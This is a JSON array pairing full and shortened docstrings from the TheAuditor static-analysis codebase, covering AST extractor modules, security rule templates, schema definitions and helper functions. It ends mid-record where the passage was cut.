[
  {
    "file": "theauditor/ast_extractors/python/__init__.py",
    "line": -1,
    "original_lines": 89,
    "original": "\"\"\"Python AST extraction - Modular architecture (Phase 2.1 - Oct 2025).\n\n⚠️  IMPORTANT: THIS IS THE SINGLE SOURCE OF TRUTH FOR PYTHON EXTRACTION ⚠️\n\nThis package is imported as `python_impl` throughout the codebase:\n  - Base AST parser: `from . import python as python_impl` (ast_extractors/__init__.py:51)\n  - Python extractor: `from theauditor.ast_extractors import python as python_impl` (indexer/extractors/python.py:28)\n\nOLD architecture (DEPRECATED):\n  - python_impl.py (1594-line monolithic file) - kept for rollback only, NOT used in production\n\nNEW architecture (ACTIVE):\n  - This package (__init__.py) orchestrates modular extraction\n  - All functions re-exported here for backward compatibility\n  - Acts like JavaScript's js_helper_templates.py pattern (but with Python imports, not file reads)\n\nModule Boundaries:\n==================\n\ncore_extractors.py (812 lines):\n    - Language fundamentals: imports, functions, classes, assignments\n    - Core patterns: properties, calls, returns, exports\n    - Type annotations and helper functions\n\nframework_extractors.py (568 lines):\n    - Web frameworks: Django, Flask, FastAPI\n    - ORM frameworks: SQLAlchemy, Django ORM\n    - Validators: Pydantic\n    - Background tasks: Celery (Phase 2.2)\n\ncdk_extractor.py (NEW - AWS CDK support):\n    - AWS CDK Infrastructure-as-Code: CDK v2 construct extraction\n    - Security property extraction for cloud infrastructure\n\ncfg_extractor.py (290 lines):\n    - Control Flow Graph extraction\n    - Matches JavaScript cfg_extractor.js pattern\n\nasync_extractors.py: (Phase 2.2 - NOT YET IMPLEMENTED)\n    - Async functions, await expressions\n    - Async context managers, async generators\n    - AsyncIO patterns\n\ntesting_extractors.py: (Phase 2.2 - NOT YET IMPLEMENTED)\n    - pytest fixtures, parametrize, markers\n    - unittest patterns, mocking\n\ntype_extractors.py: (Phase 2.2 - NOT YET IMPLEMENTED)\n    - Advanced type system: Protocol, Generic, TypedDict\n    - Literal types, overload decorators\n\nBackward Compatibility (HOUSE OF CARDS - but it works!):\n=========================================================\nAll functions are re-exported at package level for backward compatibility.\nExisting code using `from python_impl import extract_*` will continue working\nvia re-exports in this __init__.py.\n\nThe import alias `python as python_impl` ensures ALL code paths use THIS package,\nnot the old python_impl.py monolith. This is the glue holding the refactor together.\n\nArchitecture Contract (CRITICAL - DO NOT VIOLATE):\n==================================================\nAll extraction functions:\n- RECEIVE: AST tree only (no file path context)\n- EXTRACT: Data with 'line' numbers and content\n- RETURN: List[Dict] with keys like 'line', 'name', 'type', etc.\n- MUST NOT: Include 'file' or 'file_path' keys in returned dicts\n\nFile path context is provided by the INDEXER layer when storing to database.\nThis separation ensures single source of truth for file paths.\n\nFor Future Developers (AI and Human):\n======================================\nIf you're reading this wondering \"why are there two python_impl things?\":\n  1. python_impl.py = OLD monolith (DEPRECATED, kept for rollback)\n  2. python/ package = NEW modular structure (THIS FILE - production)\n  3. Import alias makes them interchangeable: `from . import python as python_impl`\n  4. This is intentional technical debt - don't \"fix\" it without understanding the import chain\n\nVerification Commands:\n======================\n# Test import resolution works correctly:\npython -c \"from theauditor.ast_extractors import python_impl; print(python_impl.__file__)\"\n# Should print: .../theauditor/ast_extractors/python/__init__.py (NOT python_impl.py)\n\n# Test function availability:\npython -c \"from theauditor.ast_extractors import python_impl; print(hasattr(python_impl, 'extract_python_cdk_constructs'))\"\n# Should print: True (this function only exists in NEW package)\n\"\"\"",
    "truncated": "\"\"\"Python AST extraction - Modular architecture (Phase 2.1 - Oct 2025).\"\"\""
  },
  {
    "file": "theauditor/rules/TEMPLATE_JSX_RULE.py",
    "line": -1,
    "original_lines": 83,
    "original": "\"\"\"RULE TEMPLATE: JSX-Specific Rule (Requires Preserved JSX Pass).\n\n================================================================================\nRULE TEMPLATE DOCUMENTATION\n================================================================================\n\n⚠️ CRITICAL: FUNCTION NAMING REQUIREMENT\n--------------------------------------------------------------------------------\nYour rule function MUST start with 'find_' prefix:\n  ✅ def find_jsx_injection(context: StandardRuleContext)\n  ✅ def find_react_xss(context: StandardRuleContext)\n  ❌ def analyze(context: StandardRuleContext)  # WRONG - Won't be discovered!\n  ❌ def detect_xss(context: StandardRuleContext)  # WRONG - Must start with find_\n\nThe orchestrator ONLY discovers functions starting with 'find_'. Any other\nname will be silently ignored and your rule will never run.\n--------------------------------------------------------------------------------\n\n⚠️ CRITICAL: StandardFinding PARAMETER NAMES\n--------------------------------------------------------------------------------\nALWAYS use these EXACT parameter names when creating findings:\n  ✅ file_path=     (NOT file=)\n  ✅ rule_name=     (NOT rule=)\n  ✅ cwe_id=        (NOT cwe=)\n  ✅ severity=Severity.CRITICAL (NOT severity='CRITICAL')\n\nUsing wrong names will cause RUNTIME CRASHES. See examples at line 297+.\n--------------------------------------------------------------------------------\n\nThis template is for JSX-SPECIFIC RULES that analyze React/Vue components and\nrequire access to PRESERVED JSX syntax. These rules:\n\n✅ Run on: .jsx, .tsx, .vue files ONLY\n✅ Query: JSX-specific tables (symbols_jsx, function_call_args_jsx, etc.)\n✅ Use: Preserved JSX data (before transformation to React.createElement)\n❌ Skip: Backend .py, .js files (filtered by orchestrator)\n\nWHEN TO USE THIS TEMPLATE:\n- JSX element injection patterns (<{UserInput} />)\n- JSX attribute injection ({...userProps})\n- Component name security (dynamic component rendering)\n- JSX-specific XSS patterns (lost in transformation)\n- React/Vue component security patterns\n\nWHEN NOT TO USE THIS TEMPLATE:\n- React hooks analysis (useState/useEffect) → Use TEMPLATE_STANDARD_RULE.py\n  (Hooks work on TRANSFORMED data, available in standard tables)\n- Backend SQL injection → Use TEMPLATE_STANDARD_RULE.py\n- General XSS (dangerouslySetInnerHTML) → Use TEMPLATE_STANDARD_RULE.py\n  (Available in standard tables)\n\n================================================================================\nWHY PRESERVED JSX?\n================================================================================\n\nJSX transformation loses information:\n\nBEFORE (Preserved JSX):\n  const UserProfile = () => <div className={userClass}>{userName}</div>\n\nAFTER (Transformed):\n  const UserProfile = () => React.createElement('div', {className: userClass}, userName)\n\nInformation LOST in transformation:\n- JSX tag syntax (< >)\n- Attribute vs children distinction\n- Self-closing tag detection\n- Spread operator context ({...props})\n\nInformation PRESERVED in both:\n- Function calls (React.createElement)\n- Variable usage (userClass, userName)\n- Hook calls (useState, useEffect)\n\nRULE OF THUMB:\n- If you need to detect JSX SYNTAX → Use this template (requires_jsx_pass=True)\n- If you detect FUNCTION CALLS → Use standard template (requires_jsx_pass=False)\n\n================================================================================\nTEMPLATE BASED ON: react_xss_analyze.py (Production Rule)\nRULE METADATA: JSX-specific with framework detection\n================================================================================\n\"\"\"",
    "truncated": "\"\"\"RULE TEMPLATE: JSX-Specific Rule (Requires Preserved JSX Pass).\"\"\""
  },
  {
    "file": "theauditor/rules/TEMPLATE_STANDARD_RULE.py",
    "line": -1,
    "original_lines": 56,
    "original": "\"\"\"RULE TEMPLATE: Standard Backend/Database Rule (No JSX Required).\n\n================================================================================\nRULE TEMPLATE DOCUMENTATION\n================================================================================\n\n⚠️ CRITICAL: FUNCTION NAMING REQUIREMENT\n--------------------------------------------------------------------------------\nYour rule function MUST start with 'find_' prefix:\n  ✅ def find_sql_injection(context: StandardRuleContext)\n  ✅ def find_hardcoded_secrets(context: StandardRuleContext)\n  ❌ def analyze(context: StandardRuleContext)  # WRONG - Won't be discovered!\n  ❌ def detect_xss(context: StandardRuleContext)  # WRONG - Must start with find_\n\nThe orchestrator ONLY discovers functions starting with 'find_'. Any other\nname will be silently ignored and your rule will never run.\n--------------------------------------------------------------------------------\n\n⚠️ CRITICAL: StandardFinding PARAMETER NAMES\n--------------------------------------------------------------------------------\nALWAYS use these EXACT parameter names when creating findings:\n  ✅ file_path=     (NOT file=)\n  ✅ rule_name=     (NOT rule=)\n  ✅ cwe_id=        (NOT cwe=)\n  ✅ severity=Severity.HIGH (NOT severity='HIGH')\n\nUsing wrong names will cause RUNTIME CRASHES. See examples at line 250.\n--------------------------------------------------------------------------------\n\nThis template is for STANDARD RULES that analyze backend code, databases, or\ngeneral language patterns. These rules:\n\n✅ Run on: .py, .js, .ts files (backend/server code)\n✅ Query: Standard tables (function_call_args, symbols, assignments, etc.)\n✅ Skip: Frontend JSX/TSX files (filtered by orchestrator)\n❌ Do NOT use: JSX-specific tables (*_jsx tables)\n\nWHEN TO USE THIS TEMPLATE:\n- SQL injection detection\n- Authentication/authorization issues\n- Backend API security\n- Database query analysis\n- Server-side validation\n- ORM/database patterns\n- Python/Node.js specific issues\n\nWHEN NOT TO USE THIS TEMPLATE:\n- React/Vue component analysis → Use TEMPLATE_JSX_RULE.py\n- Frontend-specific XSS → Use TEMPLATE_JSX_RULE.py\n- JSX element injection → Use TEMPLATE_JSX_RULE.py\n\n================================================================================\nTEMPLATE BASED ON: sql_injection_analyze.py (Production Rule)\nRULE METADATA: Declares file targeting to skip frontend files\n================================================================================\n\"\"\"",
    "truncated": "\"\"\"RULE TEMPLATE: Standard Backend/Database Rule (No JSX Required).\"\"\""
  },
  {
    "file": "theauditor/indexer/schema.py",
    "line": -1,
    "original_lines": 46,
    "original": "\"\"\"\nDatabase schema definitions - Single Source of Truth.\n\nCRITICAL: After adding/modifying ANY table schema, you MUST run:\n    python -m theauditor.indexer.schemas.codegen\nThis regenerates generated_cache.py which the taint analyzer ACTUALLY uses!\nWithout this step, your new tables will NOT be loaded into memory!\n\nThis module is now a STUB that merges language-specific schema modules.\nThe actual table definitions have been split into:\n- schemas/core_schema.py (21 tables - language-agnostic core patterns)\n- schemas/security_schema.py (5 tables - cross-language security patterns)\n- schemas/frameworks_schema.py (5 tables - cross-language framework patterns)\n- schemas/python_schema.py (30 tables - Python-specific: 8 original + 20 consolidated + 2 decomposed)\n- schemas/node_schema.py (17 tables - Node/React/Vue/TypeScript)\n- schemas/infrastructure_schema.py (18 tables - Docker/Terraform/CDK/GitHub Actions)\n- schemas/planning_schema.py (5 tables - Planning/meta-system)\n- schemas/graphql_schema.py (8 tables - GraphQL schema, types, fields, resolvers)\n\nThis stub maintains 100% backward compatibility with all existing imports.\n\nDesign Philosophy:\n- Indexer creates tables from these schemas\n- Taint analyzer queries using these schemas\n- Pattern rules query using these schemas\n- Memory cache pre-loads using these schemas\n- NO MORE HARDCODED COLUMN NAMES\n\nUsage:\n    from theauditor.indexer.schema import TABLES, build_query\n\n    # Build a query dynamically:\n    query = build_query('variable_usage', ['file', 'line', 'variable_name'])\n    # Returns: \"SELECT file, line, variable_name FROM variable_usage\"\n\n    # Validate database matches schema:\n    mismatches = validate_all_tables(cursor)\n    if mismatches:\n        print(f\"Schema errors: {mismatches}\")\n\nSchema Contract:\n- This is the SINGLE source of truth for ALL database schemas\n- Changes here propagate to ALL consumers automatically\n- Schema validation runs at indexing time and analysis time\n- Breaking changes detected at runtime, not production\n\"\"\"",
    "truncated": "\"\"\"Database schema definitions - Single Source of Truth.\"\"\""
  },
  {
    "file": "theauditor/utils/meta_findings.py",
    "line": -1,
    "original_lines": 46,
    "original": "\"\"\"\n    Format a meta-analysis finding into standard findings_consolidated schema.\n\n    Meta-findings are factual observations about code architecture, complexity,\n    churn, and coverage. They maintain Truth Courier principles by reporting\n    only verifiable facts without interpretation (unless from insights module).\n\n    Args:\n        finding_type: Type of meta-finding (e.g., \"HOTSPOT\", \"HIGH_COMPLEXITY\",\n                     \"HIGH_CHURN\", \"LOW_COVERAGE\")\n        file_path: Path to the file where finding was detected\n        message: Human-readable description of the finding\n        severity: Severity level (\"critical\", \"high\", \"medium\", \"low\")\n        line: Line number (0 if file-level finding)\n        category: Finding category (default: \"architectural\")\n        confidence: Confidence score 0.0-1.0 (default: 1.0 for factual findings)\n        tool: Tool name (default: \"meta-analysis\")\n        additional_info: Optional dict of additional finding data\n\n    Returns:\n        Dict formatted for findings_consolidated table insertion\n\n    Example:\n        >>> format_meta_finding(\n        ...     finding_type=\"ARCHITECTURAL_HOTSPOT\",\n        ...     file_path=\"src/core/auth.py\",\n        ...     message=\"High connectivity: 47 dependencies\",\n        ...     severity=\"high\",\n        ...     confidence=1.0\n        ... )\n        {\n            'file': 'src/core/auth.py',\n            'line': 0,\n            'column': None,\n            'rule': 'ARCHITECTURAL_HOTSPOT',\n            'tool': 'meta-analysis',\n            'message': 'High connectivity: 47 dependencies',\n            'severity': 'high',\n            'category': 'architectural',\n            'confidence': 1.0,\n            'code_snippet': None,\n            'cwe': None,\n            'timestamp': '2025-01-...',\n            'additional_info': {...}\n        }\n    \"\"\"",
    "truncated": "\"\"\"Format a meta-analysis finding into standard findings_consolidated schema.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/fundamental_extractors.py",
    "line": -1,
    "original_lines": 44,
    "original": "\"\"\"Fundamental Python pattern extractors - Core language constructs.\n\nThis module contains extraction logic for fundamental Python patterns:\n- Comprehensions (list, dict, set, generator)\n- Lambda functions with closure detection\n- Slice operations (start:stop:step)\n- Tuple operations (pack/unpack)\n- Unpacking patterns (extended unpacking)\n- None handling patterns\n- Truthiness patterns\n- String formatting (f-strings, %, format())\n\nARCHITECTURAL CONTRACT: File Path Responsibility\n=================================================\nAll functions here:\n- RECEIVE: AST tree only (no file path context)\n- EXTRACT: Data with 'line' numbers and content\n- RETURN: List[Dict] with pattern-specific keys\n- MUST NOT: Include 'file' or 'file_path' keys in returned dicts\n\nFile path context is provided by the INDEXER layer when storing to database.\nThis separation ensures single source of truth for file paths.\n\nWeek 1 Implementation (Python Coverage V2):\n============================================\nImplements 25 patterns for Python fundamentals:\n- Comprehensions: All 4 types with nesting and filter detection\n- Lambda functions: With closure variable capture\n- Slices: All slice notation patterns\n- Tuples: Pack and unpack operations\n- Unpacking: Extended unpacking with *rest patterns\n- None patterns: is None vs == None detection\n- String formatting: All format types (f-string, %, format(), Template)\n\nExpected extraction from TheAuditor codebase:\n- ~200 comprehensions (list/dict/set/generator)\n- ~100 lambda functions\n- ~150 slice operations\n- ~300 tuple operations\n- ~50 unpacking patterns\n- ~200 None patterns\n- ~100 string formatting patterns\nTotal: ~1,100 fundamental pattern records\n\"\"\"",
    "truncated": "\"\"\"Fundamental Python pattern extractors - Core language constructs.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/state_mutation_extractors.py",
    "line": -1,
    "original_lines": 44,
    "original": "\"\"\"State mutation extractors - Instance, class, global, argument mutations.\n\nThis module contains extraction logic for state mutation patterns:\n- Instance attribute mutations (self.x = value)\n- Class attribute mutations (ClassName.x = value, cls.x = value)\n- Global variable mutations (global x; x = value)\n- Mutable argument modifications (def foo(lst): lst.append(x))\n- Augmented assignments (+=, -=, *=, etc. on any target)\n\nARCHITECTURAL CONTRACT: File Path Responsibility\n=================================================\nAll functions here:\n- RECEIVE: AST tree only (no file path context)\n- EXTRACT: Data with 'line' numbers and content\n- RETURN: List[Dict] with keys like 'line', 'target', 'operation', etc.\n- MUST NOT: Include 'file' or 'file_path' keys in returned dicts\n\nFile path context is provided by the INDEXER layer when storing to database.\nThis separation ensures single source of truth for file paths.\n\nCausal Learning Purpose:\n========================\nThese extractors enable hypothesis generation for DIEC tool:\n- \"Function X modifies instance attribute Y\" → Test by checking object.Y before/after\n- \"Function has side effects on class state\" → Test by monitoring class attributes\n- \"Function has global side effects\" → Test by monitoring global variables\n- \"Function mutates its arguments\" → Test by checking argument state before/after\n\nEach extraction enables >3 hypothesis types per python_coverage.md requirements.\nTarget >70% validation rate when hypotheses are tested experimentally.\n\nWeek 1 Implementation (Priority 1 - Side Effects):\n===================================================\nThis is the HIGHEST VALUE extraction for causal learning. Side effects are the #1\nthing static analysis cannot prove but experimentation can validate.\n\nExpected extraction from TheAuditor codebase:\n- ~500 instance mutations (self.x = value)\n- ~80 class mutations (ClassName.instances += 1)\n- ~100 global mutations (global _cache; _cache[key] = value)\n- ~200 argument mutations (def foo(lst): lst.append(x))\n- ~2,100 augmented assignments (x += 1, y *= 2, etc.)\nTotal: ~3,000 state mutation records\n\"\"\"",
    "truncated": "\"\"\"State mutation extractors - Instance, class, global, argument mutations.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/data_flow_extractors.py",
    "line": -1,
    "original_lines": 42,
    "original": "\"\"\"Data flow extractors - I/O operations, parameter flows, closures, nonlocal.\n\nThis module contains extraction logic for data flow patterns:\n- I/O operations (file, database, network, process, environment)\n- Parameter to return flow tracking\n- Closure variable captures\n- Nonlocal variable access\n\nARCHITECTURAL CONTRACT: File Path Responsibility\n=================================================\nAll functions here:\n- RECEIVE: AST tree only (no file path context)\n- EXTRACT: Data with 'line' numbers and content\n- RETURN: List[Dict] with keys like 'line', 'io_type', 'operation', etc.\n- MUST NOT: Include 'file' or 'file_path' keys in returned dicts\n\nFile path context is provided by the INDEXER layer when storing to database.\nThis separation ensures single source of truth for file paths.\n\nCausal Learning Purpose:\n========================\nThese extractors enable hypothesis generation for DIEC tool:\n- \"Function X writes to filesystem\" → Test by mocking filesystem, verify write\n- \"Function X returns transformed parameter Y\" → Test with known input, verify output\n- \"Function depends on outer variable Z\" → Test closure behavior\n- \"Nested function modifies outer variable\" → Test nonlocal mutation\n\nEach extraction enables >3 hypothesis types per python_coverage.md requirements.\nTarget >70% validation rate when hypotheses are tested experimentally.\n\nWeek 2 Implementation (Priority 3 - Data Flow):\n=================================================\nData flow is critical for taint analysis and security hypothesis generation.\nUnderstanding how data moves through code enables detection of injection vulnerabilities.\n\nExpected extraction from TheAuditor codebase:\n- ~2,000 I/O operations (file, db, network, process, env)\n- ~1,500 parameter return flows\n- ~300 closure captures\n- ~50 nonlocal accesses\nTotal: ~3,850 data flow records\n\"\"\"",
    "truncated": "\"\"\"Data flow extractors - I/O operations, parameter flows, closures, nonlocal.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/exception_flow_extractors.py",
    "line": -1,
    "original_lines": 42,
    "original": "\"\"\"Exception flow extractors - Raises, catches, finally blocks, context managers.\n\nThis module contains extraction logic for exception control flow patterns:\n- Exception raises (raise ValueError(\"msg\"))\n- Exception handlers (except ValueError as e: ...)\n- Finally blocks (finally: cleanup())\n- Context manager cleanup (already exists in core_extractors, enhanced here)\n\nARCHITECTURAL CONTRACT: File Path Responsibility\n=================================================\nAll functions here:\n- RECEIVE: AST tree only (no file path context)\n- EXTRACT: Data with 'line' numbers and content\n- RETURN: List[Dict] with keys like 'line', 'exception_type', 'handling_strategy', etc.\n- MUST NOT: Include 'file' or 'file_path' keys in returned dicts\n\nFile path context is provided by the INDEXER layer when storing to database.\nThis separation ensures single source of truth for file paths.\n\nCausal Learning Purpose:\n========================\nThese extractors enable hypothesis generation for DIEC tool:\n- \"Function X raises ValueError when input is negative\" → Test with invalid input, assert exception\n- \"Function converts ValueError to None\" → Test error handling strategy\n- \"Function always releases lock even on error\" → Test resource cleanup in finally block\n- \"Function guarantees resource cleanup via context manager\" → Test cleanup occurs\n\nEach extraction enables >3 hypothesis types per python_coverage.md requirements.\nTarget >70% validation rate when hypotheses are tested experimentally.\n\nWeek 1 Implementation (Priority 1 - Exception Flow):\n======================================================\nException flow is fundamental to robustness. Cannot design experiments without knowing\nwhat exceptions can occur and how they're handled.\n\nExpected extraction from TheAuditor codebase:\n- ~800 exception raises (raise statements)\n- ~600 exception handlers (except clauses)\n- ~200 finally blocks\n- ~400 context managers (already extracted by core_extractors.py)\nTotal: ~2,000 exception flow records\n\"\"\"",
    "truncated": "\"\"\"Exception flow extractors - Raises, catches, finally blocks, context managers.\"\"\""
  },
  {
    "file": "theauditor/utils/helpers.py",
    "line": -1,
    "original_lines": 42,
    "original": "\"\"\"Normalize a file path for database queries.\n\n    CRITICAL: Use this function before ANY database query that matches file paths.\n    The database stores Unix-style relative paths. This function converts Windows\n    absolute paths to match.\n\n    Transformations:\n    1. Convert backslashes to forward slashes (Windows -> Unix)\n    2. Strip project root prefix if provided (absolute -> relative)\n    3. Strip leading slashes\n\n    Args:\n        file_path: The file path to normalize (can be absolute or relative,\n                   Windows or Unix style)\n        project_root: Optional project root to strip. If the file_path starts\n                      with this root, it will be removed to create a relative path.\n\n    Returns:\n        Normalized path suitable for database LIKE queries\n\n    Examples:\n        >>> normalize_path_for_db(\"theauditor\\\\context\\\\query.py\")\n        'theauditor/context/query.py'\n\n        >>> normalize_path_for_db(\n        ...     \"C:\\\\Users\\\\santa\\\\Desktop\\\\TheAuditor\\\\theauditor\\\\cli.py\",\n        ...     project_root=\"C:\\\\Users\\\\santa\\\\Desktop\\\\TheAuditor\"\n        ... )\n        'theauditor/cli.py'\n\n        >>> normalize_path_for_db(\"src/auth.ts\")\n        'src/auth.ts'\n\n    Usage in query.py:\n        from theauditor.utils.helpers import normalize_path_for_db\n\n        def get_file_symbols(self, file_path: str, limit: int = 50):\n            # ALWAYS normalize before querying!\n            normalized = normalize_path_for_db(file_path, self.root_dir)\n            cursor.execute(\"SELECT * FROM symbols WHERE path LIKE ?\",\n                          (f\"%{normalized}\",))\n    \"\"\"",
    "truncated": "\"\"\"Normalize a file path for database queries.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/behavioral_extractors.py",
    "line": -1,
    "original_lines": 41,
    "original": "\"\"\"Behavioral pattern extractors - Recursion, generators, properties, dynamic attributes.\n\nThis module contains extraction logic for behavioral patterns:\n- Recursion patterns (direct, mutual, tail recursion)\n- Generator yield patterns (extends core_extractors.py generators)\n- Property access patterns (computed properties, validated setters)\n- Dynamic attribute access (__getattr__, __setattr__, __getattribute__)\n\nARCHITECTURAL CONTRACT: File Path Responsibility\n=================================================\nAll functions here:\n- RECEIVE: AST tree only (no file path context)\n- EXTRACT: Data with 'line' numbers and content\n- RETURN: List[Dict] with keys like 'line', 'recursion_type', 'property_name', etc.\n- MUST NOT: Include 'file' or 'file_path' keys in returned dicts\n\nFile path context is provided by the INDEXER layer when storing to database.\nThis separation ensures single source of truth for file paths.\n\nCausal Learning Purpose:\n========================\nThese extractors enable hypothesis generation for DIEC tool:\n- \"Function X uses recursion with base case Y\" → Test recursive behavior\n- \"Generator X yields when condition Y\" → Test lazy evaluation\n- \"Property X computes value rather than storing\" → Test computed properties\n- \"Class uses dynamic attribute interception\" → Test __getattr__ behavior\n\nEach extraction enables >3 hypothesis types per python_coverage.md requirements.\nTarget >70% validation rate when hypotheses are tested experimentally.\n\nWeek 3 Implementation (Priority 5 - Behavioral):\n=================================================\nBehavioral patterns reveal algorithm characteristics that can only be verified through testing.\n\nExpected extraction from TheAuditor codebase:\n- ~80 recursion patterns (direct, mutual, tail)\n- ~200 generator yields (enhanced from existing extractor)\n- ~150 property patterns\n- ~10 dynamic attribute patterns\nTotal: ~430 behavioral pattern records\n\"\"\"",
    "truncated": "\"\"\"Behavioral pattern extractors - Recursion, generators, properties, dynamic attributes.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/operator_extractors.py",
    "line": -1,
    "original_lines": 40,
    "original": "\"\"\"Operator and expression extractors - All operator types and advanced expressions.\n\nThis module contains extraction logic for operators and expressions:\n- All operator types (arithmetic, comparison, logical, bitwise, membership)\n- Chained comparisons (1 < x < 10)\n- Ternary expressions (x if y else z)\n- Walrus operators (:= assignments)\n- Matrix multiplication (@)\n\nARCHITECTURAL CONTRACT: File Path Responsibility\n=================================================\nAll functions here:\n- RECEIVE: AST tree only (no file path context)\n- EXTRACT: Data with 'line' numbers and content\n- RETURN: List[Dict] with pattern-specific keys\n- MUST NOT: Include 'file' or 'file_path' keys in returned dicts\n\nWeek 2 Implementation (Python Coverage V2):\n============================================\nImplements 15 operator and expression patterns:\n- Binary operators: +, -, *, /, //, %, **, @\n- Comparison operators: <, >, <=, >=, ==, !=, is, is not\n- Logical operators: and, or, not\n- Bitwise operators: &, |, ^, ~, <<, >>\n- Membership tests: in, not in\n- Chained comparisons: 1 < x < 10\n- Ternary expressions: x if condition else y\n- Walrus operators: x := expression\n\nExpected extraction from TheAuditor codebase:\n- ~500 binary operators\n- ~300 comparison operators\n- ~200 logical operators\n- ~50 bitwise operators\n- ~100 membership tests\n- ~30 chained comparisons\n- ~50 ternary expressions\n- ~20 walrus operators\nTotal: ~1,250 operator pattern records\n\"\"\"",
    "truncated": "\"\"\"Operator and expression extractors - All operator types and advanced expressions.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/class_feature_extractors.py",
    "line": -1,
    "original_lines": 39,
    "original": "\"\"\"Advanced class feature extractors - Metaclasses, descriptors, dataclasses, enums.\n\nThis module contains extraction logic for advanced Python class features:\n- Metaclasses (type subclasses, __metaclass__)\n- Descriptors (__get__, __set__, __delete__)\n- Dataclasses (@dataclass decorator and fields)\n- Enums (Enum subclasses and members)\n- Slots (__slots__ optimization)\n- Abstract base classes (ABC, @abstractmethod)\n- Class methods and static methods (@classmethod, @staticmethod)\n- Multiple inheritance and MRO\n- Dunder methods (__init__, __str__, __repr__, __eq__, etc.)\n- Visibility conventions (_private, __name_mangling)\n\nARCHITECTURAL CONTRACT: File Path Responsibility\n=================================================\nAll functions here:\n- RECEIVE: AST tree only (no file path context)\n- EXTRACT: Data with 'line' numbers and content\n- RETURN: List[Dict] with pattern-specific keys\n- MUST NOT: Include 'file' or 'file_path' keys in returned dicts\n\nWeek 4 Implementation (Python Coverage V2):\n============================================\nImplements advanced class features.\n\nExpected extraction from TheAuditor codebase:\n- ~5 metaclasses\n- ~10 descriptors\n- ~20 dataclasses\n- ~10 enums\n- ~15 __slots__ usage\n- ~30 abstract classes\n- ~100 class/static methods\n- ~50 multiple inheritance cases\n- ~200 dunder methods\n- ~150 visibility patterns\nTotal: ~590 advanced class feature records\n\"\"\"",
    "truncated": "\"\"\"Advanced class feature extractors - Metaclasses, descriptors, dataclasses, enums.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/control_flow_extractors.py",
    "line": -1,
    "original_lines": 39,
    "original": "\"\"\"Control flow and import extractors - Loops, conditionals, match, imports, flow control.\n\nThis module contains extraction logic for control flow patterns:\n- For loops (with enumerate, zip, else clause detection)\n- While loops (with else clause, infinite loop detection)\n- Async for loops (async iteration patterns)\n- If/elif/else statements (chain length, nested detection)\n- Match statements (Python 3.10+ pattern matching with guards)\n- Break/continue/pass statements (loop control flow)\n- Assert statements (with message detection)\n- Del statements (deletion patterns)\n- Import statements (security/performance patterns)\n- With statements (context manager usage)\n\nARCHITECTURAL CONTRACT: File Path Responsibility\n=================================================\nAll functions here:\n- RECEIVE: AST tree only (no file path context)\n- EXTRACT: Data with 'line' numbers and content\n- RETURN: List[Dict] with pattern-specific keys\n- MUST NOT: Include 'file' or 'file_path' keys in returned dicts\n\nWeek 5 Implementation (Python Coverage V2):\n============================================\nImplements 10 control flow patterns.\n\nExpected extraction from TheAuditor codebase:\n- ~400 for loops\n- ~150 while loops\n- ~20 async for loops\n- ~600 if statements\n- ~15 match statements\n- ~200 break/continue/pass\n- ~100 assert statements\n- ~50 del statements\n- ~500 import statements\n- ~80 with statements\nTotal: ~2,115 control flow records\n\"\"\"",
    "truncated": "\"\"\"Control flow and import extractors - Loops, conditionals, match, imports, flow control.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/protocol_extractors.py",
    "line": -1,
    "original_lines": 39,
    "original": "\"\"\"Protocol and module pattern extractors - Dunder protocols and module metadata.\n\nThis module contains extraction logic for Python protocols:\n- Iterator protocol (__iter__, __next__, StopIteration)\n- Container protocol (__len__, __getitem__, __setitem__, __delitem__, __contains__)\n- Callable protocol (__call__)\n- Comparison protocol (rich comparison methods)\n- Arithmetic protocol (numeric dunder methods)\n- Pickle protocol (__getstate__, __setstate__, __reduce__)\n- Weak reference usage (weakref module)\n- Context variables (contextvars module)\n- Module attributes (__name__, __file__, __doc__, __all__)\n- Class decorators (separate from method decorators)\n\nARCHITECTURAL CONTRACT: File Path Responsibility\n=================================================\nAll functions here:\n- RECEIVE: AST tree only (no file path context)\n- EXTRACT: Data with 'line' numbers and content\n- RETURN: List[Dict] with pattern-specific keys\n- MUST NOT: Include 'file' or 'file_path' keys in returned dicts\n\nWeek 6 Implementation (Python Coverage V2):\n============================================\nImplements 10 protocol patterns.\n\nExpected extraction from TheAuditor codebase:\n- ~80 iterator protocol implementations\n- ~120 container protocol implementations\n- ~60 callable protocol implementations\n- ~200 comparison protocol implementations\n- ~150 arithmetic protocol implementations\n- ~20 pickle protocol implementations\n- ~30 weakref usage\n- ~15 contextvar usage\n- ~200 module attribute usage\n- ~25 class decorators\nTotal: ~900 protocol records\n\"\"\"",
    "truncated": "\"\"\"Protocol and module pattern extractors - Dunder protocols and module metadata.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/performance_extractors.py",
    "line": -1,
    "original_lines": 38,
    "original": "\"\"\"Performance pattern extractors - Loop complexity, resource usage, memoization.\n\nThis module contains extraction logic for performance-related patterns:\n- Loop complexity (nested loops, growing operations)\n- Resource usage (large allocations, unclosed file handles)\n- Memoization patterns (@lru_cache, manual caching, missing opportunities)\n\nARCHITECTURAL CONTRACT: File Path Responsibility\n=================================================\nAll functions here:\n- RECEIVE: AST tree only (no file path context)\n- EXTRACT: Data with 'line' numbers and content\n- RETURN: List[Dict] with keys like 'line', 'nesting_level', 'resource_type', etc.\n- MUST NOT: Include 'file' or 'file_path' keys in returned dicts\n\nFile path context is provided by the INDEXER layer when storing to database.\nThis separation ensures single source of truth for file paths.\n\nCausal Learning Purpose:\n========================\nThese extractors enable hypothesis generation for DIEC tool:\n- \"Function X has O(n²) complexity due to nested loops\" → Test performance scaling\n- \"Function allocates large memory structures\" → Measure memory usage\n- \"Function would benefit from memoization\" → Test with/without caching\n\nEach extraction enables >3 hypothesis types per python_coverage.md requirements.\nTarget >70% validation rate when hypotheses are tested experimentally.\n\nWeek 4 Implementation (Priority 7 - Performance):\n===================================================\nPerformance characteristics can only be validated through measurement.\n\nExpected extraction from TheAuditor codebase:\n- ~250 loop complexity patterns\n- ~100 resource usage patterns\n- ~50 memoization 